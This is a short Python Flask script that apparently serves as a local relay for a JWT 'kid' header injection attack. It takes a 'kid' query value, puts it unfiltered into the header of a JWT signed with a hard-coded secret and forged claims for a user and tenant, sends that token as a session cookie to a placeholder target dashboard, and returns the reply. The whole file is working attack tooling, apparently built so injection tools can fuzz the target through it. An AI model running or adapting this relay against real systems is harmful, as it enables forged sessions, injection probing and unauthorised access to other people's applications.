from flask import Flask, request, jsonify
import requests
import jwt 
import datetime

app = Flask(__name__)

TARGET_HOST = "http://HOST/dashboard"  
TEST_SECRET = "test1111111111111111111111111111111111"

@app.route("/", methods=["GET"])
def relay():
    value = request.args.get("kid")
    if value is None:
        return jsonify({"error": "missing 'value' query parameter"}), 400

    payload = {
        "iat": "1819740356",
        "username": "baadmaro",
		"tenant": "uk_office"
    }

    custom_headers = {"kid": value}

    token = jwt.encode(
        payload,
        TEST_SECRET,
        algorithm="HS256",
        headers=custom_headers
    )

    resp = requests.get(
        TARGET_HOST,
        cookies={"session": token}
    )

    return resp.text

if __name__ == "__main__":
    app.run(host="127.0.0.1", port=5000, debug=True)